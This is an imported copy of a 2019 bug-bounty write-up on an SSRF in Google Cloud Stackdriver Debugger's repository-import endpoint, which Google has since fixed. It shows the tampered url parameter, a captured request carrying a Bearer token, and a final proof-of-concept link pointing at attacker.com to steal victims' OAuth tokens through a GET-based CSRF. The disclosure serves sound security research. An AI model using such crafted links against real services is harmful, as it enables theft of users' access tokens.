---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-12-19_google-vrp-ssrf-in-google-cloud-platform-stackdriver.md
original_filename: 2019-12-19_google-vrp-ssrf-in-google-cloud-platform-stackdriver.md
title: '[Google VRP] SSRF in Google Cloud Platform StackDriver'
category: documents
detected_topics:
- oauth
- api-security
- access-control
- ssrf
- command-injection
- mfa
tags:
- imported
- documents
- oauth
- api-security
- access-control
- ssrf
- command-injection
- mfa
language: en
raw_sha256: b85de8e6f93b6009346c38555b51dd51048adbf40fc3e116c0786b7cf09f74a5
text_sha256: a1dbf7a617bb625bc9578b9a25e338ceca37add5a4dd1529c4215fdf157fa02c
ingested_at: '2026-06-28T07:32:00Z'
sensitivity: unknown
redactions_applied: false
---

# [Google VRP] SSRF in Google Cloud Platform StackDriver

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-12-19_google-vrp-ssrf-in-google-cloud-platform-stackdriver.md
- Source Type: markdown
- Detected Topics: oauth, api-security, access-control, ssrf, command-injection, mfa
- Ingested At: 2026-06-28T07:32:00Z
- Redactions Applied: False
- Raw SHA256: `b85de8e6f93b6009346c38555b51dd51048adbf40fc3e116c0786b7cf09f74a5`
- Text SHA256: `a1dbf7a617bb625bc9578b9a25e338ceca37add5a4dd1529c4215fdf157fa02c`


## Content

---
title: "[Google VRP] SSRF in Google Cloud Platform StackDriver"
page_title: "[Google VRP] SSRF in Google Cloud Platform StackDriver – Ron Chan"
url: "https://ngailong.wordpress.com/2019/12/19/google-vrp-ssrf-in-google-cloud-platform-stackdriver/"
final_url: "https://ngailong.wordpress.com/2019/12/19/google-vrp-ssrf-in-google-cloud-platform-stackdriver/"
authors: ["Ron Chan (@ngalongc)"]
programs: ["Google"]
bugs: ["SSRF"]
publication_date: "2019-12-19"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4880
---

# [Google VRP] SSRF in Google Cloud Platform StackDriver

[ronchan](https://ngailong.wordpress.com/author/ngalog/) [Uncategorized](https://ngailong.wordpress.com/category/uncategorized/) December 19, 2019 3 Minutes

During the process of testing GAE after reading this awesome [blog post](https://sites.google.com/site/testsitehacking/-36k-google-app-engine-rce), I found a debug application in Google Cloud Platform Stackdriver, user can debug their code by importing the source code to the application. From reading [here](https://cloud.google.com/debugger/docs/source-options), user can choose to import the source code from Github, Gitlab or Bitbucket and directly debug the code within the Stackdriver Debug page. 

Integration with third party applications has proven to be problematic if they are not integrated properly, I found a special class of SSRF in the process of testing this feature.

Let’s take a look how they do it in this case.

If there is an existing app engine application deployed, you can see there are multiple ways to import source code to this debug application at <https://console.cloud.google.com/debug>

![](https://ngailong.wordpress.com/wp-content/uploads/2019/12/image-1.png?w=1024)

A click on Select Source on Bitbucket will show us a consent page that if you allow google to store oauth token in this application.

![](https://ngailong.wordpress.com/wp-content/uploads/2019/12/image-2.png?w=1024)

After authorizing in the oauth screen, user is redirected back to google and presented with user’s bitbucket/gitlab/github’s repo details.

![](https://ngailong.wordpress.com/wp-content/uploads/2019/12/image-3.png?w=1024)

By far everything looks secure, redirect_uri cannot be tampered, state parameter is used correctly. But how does Google actually fetch the list of repos and the branch names? Turns out they are doing it in these two requests.

List repo from bitbucket/gitlab/github
  
  
  https://console.cloud.google.com/m/clouddiag/debug/v2/gitlab/list?pid=groovy-plating-250224

List the branch from bitbucket/gitlab/github
  
  
  https://console.cloud.google.com/m/clouddiag/debug/v2/gitlab/resourcelist?pid=groovy-plating-250224&url=https%3A%2F%2Fgitlab.com%2Fapi%2Fv4%2Fprojects%2Fprojectid%252Fproject-one%2Frepository%2Ftags

From the second request, the url decoded version is 
  
  
  https://console.cloud.google.com/m/clouddiag/debug/v2/gitlab/resourcelist?pid=groovy-plating-250224&url=https://gitlab.com/api/v4/projects/projectid/project-one/repository/tags

We can see there is a **url** parameter in the query part, I replaced <https://gitlab.com> with <https://xxxxxxx.burpcollaborator.net> and tried to figure out is there any SSRF protection in place, and surprisingly there was none. 

More surprisingly, from Burp Collaborator, there was something else in the SSRF request.
  
  
  GET /?per_page=100 HTTP/1.1
  Host: evdjffp55g27sbbipe7uqzx1tszin7.burpcollaborator.net
  Connection: keep-alive
  Upgrade-Insecure-Requests: 1
  Authorization: Bearer 123bcad14289c8a9d3

The request comes with the Authorization header containing the Bitbucket access token. When I think about it, it makes sense to send access token along with the SSRF request since it is requesting personal information from the API endpoints, there is no way Google can do it without the access token of user.

Now we have a clear understanding how they are integrating with third party application to import the source code, and also how Google are fetching the resources(branch names, tags etc.) from different API endpoints.

This leads us to the last step, trying to exploit this SSRF that send user’s access token to arbitrary url that we specify. The idea is simple, since the request is just a GET request, instead of a POST request, if they are not protecting end user from CSRF for GET requests, then we just send the exploit url to the user and wait for the SSRF from google to send us the access token of the victim.

![](https://ngailong.wordpress.com/wp-content/uploads/2019/12/image-4.png?w=1024)

Fortunately, there is no CSRF header in the request, however there are still a few potential headers that could prevent us from exploiting this bug. They have x-pan-versionid, X-Goog-Request-Log-Data and the Referer is <https://console.cloud.google.com/>, if they are checking from the backend that these headers must be set and referer domain must match console.cloud.google.com before making the SSRF request, then this would be not exploitable. Luckily there are no such validation in the backend.

To conclude, in order to exploit this bug, attacker would need a server listening for HTTPS request, say burp collaborator, and send the crafted url to the victim that has bitbucket/gitlab/github connected to Stackdriver, then attacker would be able to steal victim’s access token from the SSRF request from Google.

Final PoC:
  
  
  https://console.cloud.google.com/m/clouddiag/debug/v2/gitlab/resourcelist?pid=groovy-plating-250224&url=https%3A%2F%2fattacker.com%2Fstealing.json

Hope you like reading this post, Google has it fixed now, although the fix is not the perfect fix, I still can’t bypass the validation in place, if you are interested, take a look and report to <https://g.co/vulnz> if you managed to bypass it!

### Share this:

  * [ Share on X (Opens in new window) X ](https://ngailong.wordpress.com/2019/12/19/google-vrp-ssrf-in-google-cloud-platform-stackdriver/?share=twitter)
  * [ Share on Facebook (Opens in new window) Facebook ](https://ngailong.wordpress.com/2019/12/19/google-vrp-ssrf-in-google-cloud-platform-stackdriver/?share=facebook)
  * 

Like Loading...

### _Related_

![Unknown's avatar](https://0.gravatar.com/avatar/02d7d4122d9839f262d9a2d0277d82c1bbfba559db8a9558017d15062ab83007?s=80&d=identicon&r=G)

##  Published by ronchan

@ngalongc [ View all posts by ronchan ](https://ngailong.wordpress.com/author/ngalog/)

**Published** December 19, 2019
